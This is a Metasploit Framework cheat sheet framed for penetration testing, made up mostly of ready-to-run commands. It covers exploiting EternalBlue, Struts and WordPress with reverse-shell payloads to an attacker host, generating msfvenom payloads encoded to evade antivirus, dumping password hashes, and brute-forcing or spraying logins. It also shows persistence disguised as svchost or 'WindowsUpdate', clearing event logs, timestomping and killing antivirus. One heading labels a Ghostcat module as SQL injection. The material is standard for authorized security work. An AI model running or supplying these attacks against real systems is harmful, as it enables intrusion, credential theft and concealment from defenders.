# Metasploit cheat sheet for penetration testing (PT)

This Metasploit Framework cheat sheet covers the essential commands and workflows for comprehensive penetration testing, from initial reconnaissance to post-exploitation and persistence.

## Metasploit Framework Cheat Sheet for Penetration Testing

### Installation & Setup

**Installing and configuring the open-source Metasploit Framework across different platforms**

bash

```
# Install on Kali Linux (pre-installed)
sudo apt update && sudo apt install metasploit-framework

# Install on Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Install on CentOS/RHEL
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Install via Git (development)
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
bundle install

# Initialize the database
sudo msfdb init
sudo msfdb start

# Update Metasploit
msfupdate

# Verify installation
msfconsole --version
```

***

### Initial Reconnaissance & Information Gathering

**Using Metasploit modules to gather intelligence about targets before exploitation**

bash

```
# Start Metasploit console
msfconsole

# Use auxiliary modules for reconnaissance
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# DNS enumeration
use auxiliary/gather/dns_enum
set DOMAIN target.com
run

# SMB share enumeration
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100-200
run

# SNMP community string scanning
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.0/24
set COMMUNITY public
run

# HTTP version detection
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.100
set RPORT 80
run
```

***

### Vulnerability Scanning & Assessment

**Identifying potential vulnerabilities using Metasploit's built-in scanners**

bash

```
# SMB vulnerability scanning
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# SSH version scanning and weak key detection
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.100
run

use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run

# HTTP vulnerability scanning
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set RPORT 80
run

# FTP anonymous access check
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASSWORD anonymous
run

# MySQL weak credentials
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/default_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/default_pass.txt
run
```

***

### Exploitation Phase

**Launching exploits against identified vulnerabilities to gain initial access**

bash

```
# Search for exploits
search eternalblue
search type:exploit platform:windows smb

# EternalBlue (MS17-010) exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit

# Apache Struts exploitation
use exploit/multi/http/struts2_rest_xstream
set RHOST 192.168.1.100
set RPORT 8080
set TARGETURI /struts2-rest-showcase/
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# PHP code injection
use exploit/unix/webapp/php_cgi_arg_injection
set RHOST 192.168.1.100
set TARGETURI /test.php
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# Set common exploit options
setg LHOST eth0              # Use interface name
setg LPORT 4444              # Default payload port
set RHOSTS file:/tmp/targets.txt  # Load targets from file
set THREADS 10               # For multiple targets
```

***

### Payload Configuration & Handlers

**Configuring payloads and setting up listeners for reverse connections**

bash

```
# Generate standalone payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o payload.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o payload.war

# Encode payloads to avoid detection
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded_payload.exe

# Set up multi/handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
set ExitOnSession false
exploit -j -z

# Web delivery method
use exploit/multi/script/web_delivery
set TARGET 2                 # Python
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
set URIPATH /
exploit
```

***

### Post-Exploitation & Lateral Movement

**Maintaining access, gathering information, and moving through the network**

bash

```
# Meterpreter basic commands
sysinfo                     # System information
getuid                      # Current user
ps                          # List processes
migrate <PID>               # Migrate to another process

# File system operations
pwd                         # Current directory
ls                          # List files
download file.txt           # Download file
upload /tmp/payload.exe     # Upload file

# Information gathering
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
run post/multi/gather/env

# Privilege escalation
getsystem                   # Attempt to get SYSTEM privileges
run post/windows/gather/enum_patches  # Check for missing patches
run post/multi/recon/local_exploit_suggester

# Lateral movement
use exploit/windows/smb/psexec
set RHOST 192.168.1.101
set SMBUser administrator
set SMBPass Password123
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# Dumping credentials
hashdump                    # Dump SAM hashes
run post/windows/gather/smart_hashdump  # Dump hashes from DC
use auxiliary/server/capture/smb        # SMB relay attack
```

***

### Persistence & Backdoors

**Establishing persistent access to compromised systems**

bash

```
# Meterpreter persistence
run persistence -X -i 30 -p 443 -r 192.168.1.50
# -X: Start at boot, -i: interval, -p: port, -r: remote host

# Schedule tasks for persistence
schtasks /create /tn "UpdateService" /tr "C:\Windows\System32\payload.exe" /sc hourly /mo 1

# Service installation
run post/windows/manage/persistence_exe
set REXEPATH /tmp/payload.exe
set REXENAME svchost.exe
set STARTUP SERVICE
set LOCALEXEPATH %TEMP%
run

# Registry persistence
reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v "WindowsUpdate" -d "C:\\Windows\\System32\\payload.exe"

# WMI event subscription for persistence
run post/windows/manage/wmi_persistence
```

***

### Network Pivoting & Tunneling

**Using compromised systems to access internal network segments**

bash

```
# View network interfaces
ipconfig
route

# Add routes for pivoting
run autoroute -s 10.1.1.0/24
run autoroute -p              # Print active routes

# SOCKS proxy for tool pivoting
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVHOST 0.0.0.0
set SRVPORT 1080
run

# Port forwarding through meterpreter
portfwd add -L 0.0.0.0 -l 3389 -r 192.168.2.100 -p 3389  # Forward RDP
portfwd add -L 0.0.0.0 -l 2222 -r 10.1.1.100 -p 22       # Forward SSH

# Scan through pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.1.1.0/24
set PORTS 80,443,22,3389
run
```

***

### Web Application Exploitation

**Targeting web applications and services specifically**

bash

```
# SQL injection exploitation
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 192.168.1.100
set RPORT 8080
run

use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set THREADS 20
run

# WordPress exploitation
use auxiliary/scanner/http/wordpress_scanner
set RHOSTS 192.168.1.100
run

use exploit/unix/webapp/wp_admin_shell_upload
set RHOST 192.168.1.100
set USERNAME admin
set PASSWORD password
set TARGETURI /wordpress
run

# Joomla exploitation
use auxiliary/scanner/http/joomla_pages
set RHOSTS 192.168.1.100
run
```

***

### Password Attacks & Cracking

**Conducting password attacks and processing captured credentials**

bash

```
# SMB login brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/default_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/default_pass.txt
set THREADS 5
run

# SSH login brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 3
run

# HTTP form brute force
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.100
set RPORT 80
set TARGETURI /admin/login.php
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Password spray attack
use auxiliary/scanner/smb/smb_login
set RHOSTS file:/tmp/targets.txt
set USER_FILE /tmp/users.txt
set PASS_FILE /tmp/passwords.txt
set THREADS 1
set DELAY 10
run
```

***

### Evasion & Anti-Forensics

**Bypassing security controls and covering tracks**

bash

```
# Payload evasion techniques
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe

# Use encoders
use encoder/x86/shikata_ga_nai
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 443
generate -t exe -e x86/shikata_ga_nai -i 10

# Clear event logs
clearev

# Timestomp - modify file timestamps
timestomp file.txt -f /path/to/reference/file

# Kill antivirus processes
run post/windows/manage/killav

# Disable Windows Defender
run post/windows/manage/killav
run post/windows/manage/enable_rdp
```

***

### Database Integration & Automation

**Using the database for efficient penetration testing workflow**

bash

```
# Database commands
db_status                   # Check database connection
hosts                       # List all hosts
services                    # List discovered services
vulns                       # List vulnerabilities
loot                        # List captured data

# Import scan results
db_import /path/to/nmap.xml
db_import /path/to/nessus.xml

# Workspace management
workspace                  # List workspaces
workspace -a client_name   # Add workspace
workspace client_name      # Switch workspace

# Export data
hosts -o /tmp/hosts.csv
services -o /tmp/services.csv

# Automation with resource scripts
makerc save.rc            # Save commands to resource file
resource /path/to/script.rc  # Run commands from file
```

***

### Useful Meterpreter Commands Quick Reference

bash

```
# System information
sysinfo, getuid, getpid, ps, kill <PID>

# File system
pwd, cd, ls, download, upload, edit, cat

# Network
ipconfig, portfwd, route

# Privilege escalation
getsystem, getsuid, run post/multi/recon/local_exploit_suggester

# Information gathering
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares

# Persistence
run persistence, run post/windows/manage/persistence_exe

# Anti-forensics
clearev, timestomp
```

***

### Common Resource Scripts for Automation

bash

```
# basic_scan.rc
workspace -a Client_Project
db_nmap -sS -A 192.168.1.0/24
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run
services -o /tmp/client_services.csv

# Run with: msfconsole -r basic_scan.rc
```

This Metasploit Framework cheat sheet covers the essential commands and workflows for comprehensive penetration testing, from initial reconnaissance to post-exploitation and persistence.
